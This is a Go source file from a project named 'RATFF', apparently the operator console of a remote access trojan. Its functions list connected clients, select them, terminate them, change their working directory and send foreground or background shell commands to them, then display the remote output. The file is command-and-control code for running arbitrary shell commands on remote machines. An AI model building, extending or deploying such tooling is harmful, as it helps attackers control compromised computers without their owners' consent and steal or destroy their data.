package main

import (
	"time"

	"RATFF/shared"
)

// listClients fetches and displays connected clients.
func listClients() {
	clients, err := fetchClients()
	if err != nil {
		PrintError(Tf("fetch_clients_failed", err))
		return
	}

	PrintClientTable(clients)
}

// selectClient validates and selects a client by ID.
func selectClient(id string) bool {
	clients, err := fetchClients()
	if err != nil {
		PrintError(Tf("fetch_clients_failed", err))
		return false
	}

	for _, c := range clients {
		if c.ID == id {
			PrintSuccess(Tf("selected_client", id))
			return true
		}
	}

	PrintError(T("client_not_exists"))
	return false
}

// deleteClient sends an exit command to the specified client.
func deleteClient(id string) {
	clients, err := fetchClients()
	if err != nil {
		PrintError(Tf("fetch_clients_failed", err))
		return
	}

	found := false
	for _, c := range clients {
		if c.ID == id {
			found = true
			break
		}
	}

	if !found {
		PrintError(T("client_not_exists"))
		return
	}

	payload := map[string]interface{}{
		"client_id": id,
		"command":   "exit",
	}
	if err := postCommand(payload); err != nil {
		PrintError(Tf("send_exit_failed", err))
		return
	}

	PrintSuccess(T("delete_success"))
}

// cdClient changes the working directory of a remote client.
func cdClient(id string, dir string) {
	clients, err := fetchClients()
	if err != nil {
		PrintError(Tf("fetch_clients_failed", err))
		return
	}

	found := false
	for _, c := range clients {
		if c.ID == id {
			found = true
			break
		}
	}

	if !found {
		PrintError(T("client_not_exists"))
		return
	}

	payload := map[string]interface{}{
		"client_id": id,
		"command":   "cd",
		"payload":   map[string]interface{}{"dir": dir},
	}

	ch := make(chan shared.Message, 1)
	pendingMu.Lock()
	pendingCmd[id] = &pendingCommand{ch: ch}
	pendingMu.Unlock()

	if err := postCommand(payload); err != nil {
		PrintError(Tf("send_command_failed", err))
		pendingMu.Lock()
		delete(pendingCmd, id)
		pendingMu.Unlock()
		return
	}

	select {
	case msg := <-ch:
		if msg.Payload != nil {
			if errMsg, ok := msg.Payload["error"].(string); ok {
				PrintError(Tf("cd_failed", errMsg))
			} else if currentDir, ok := msg.Payload["current_dir"].(string); ok {
				PrintSuccess(Tf("cd_success", dir, currentDir))
			}
		}
	case <-time.After(10 * time.Second):
		PrintError(T("command_timeout"))
		pendingMu.Lock()
		delete(pendingCmd, id)
		pendingMu.Unlock()
	}
}

// sendShellCommand sends a shell command to a client and waits for response.
func sendShellCommand(id string, cmd string) {
	payload := map[string]interface{}{
		"client_id": id,
		"command":   "shell_exec",
		"payload":   map[string]interface{}{"cmd": cmd},
	}

	ch := make(chan shared.Message, 1)
	pendingMu.Lock()
	pendingCmd[id] = &pendingCommand{ch: ch}
	pendingMu.Unlock()

	if err := postCommand(payload); err != nil {
		PrintError(Tf("send_command_failed", err))
		pendingMu.Lock()
		delete(pendingCmd, id)
		pendingMu.Unlock()
		return
	}

	select {
	case msg := <-ch:
		if msg.Payload != nil {
			stdout := ""
			stderr := ""
			exitCode := 0

			if v, ok := msg.Payload["stdout"]; ok {
				if s, ok := v.(string); ok {
					stdout = s
				}
			}
			if v, ok := msg.Payload["stderr"]; ok {
				if s, ok := v.(string); ok {
					stderr = s
				}
			}
			if v, ok := msg.Payload["exit_code"]; ok {
				if code, ok := v.(float64); ok {
					exitCode = int(code)
				} else if code, ok := v.(int); ok {
					exitCode = code
				}
			}

			PrintCommandResult(stdout, stderr, exitCode)
		}
	case <-time.After(10 * time.Second):
		PrintError(T("command_timeout"))
		pendingMu.Lock()
		delete(pendingCmd, id)
		pendingMu.Unlock()
	}
}

// sendBgCommand sends a background command to a client with optional output file.
func sendBgCommand(id string, cmd string, outputFile string) {
	payload := map[string]interface{}{
		"client_id": id,
		"command":   "shell_exec_bg",
		"payload": map[string]interface{}{
			"cmd": cmd,
		},
	}

	if outputFile != "" {
		payload["payload"].(map[string]interface{})["output_file"] = outputFile
	}

	ch := make(chan shared.Message, 1)
	pendingMu.Lock()
	pendingCmd[id] = &pendingCommand{ch: ch}
	pendingMu.Unlock()

	if err := postCommand(payload); err != nil {
		PrintError(Tf("send_command_failed", err))
		pendingMu.Lock()
		delete(pendingCmd, id)
		pendingMu.Unlock()
		return
	}

	select {
	case msg := <-ch:
		if msg.Payload != nil {
			status, _ := msg.Payload["status"].(string)
			outFile, _ := msg.Payload["output_file"].(string)
			if status == "started" {
				if outFile != "" {
					PrintSuccess(Tf("bg_command_started_with_output", cmd, outFile))
				} else {
					PrintSuccess(Tf("bg_command_started", cmd))
				}
			}
		}
	case <-time.After(5 * time.Second):
		pendingMu.Lock()
		delete(pendingCmd, id)
		pendingMu.Unlock()
		PrintError(T("command_timeout"))
	}
}
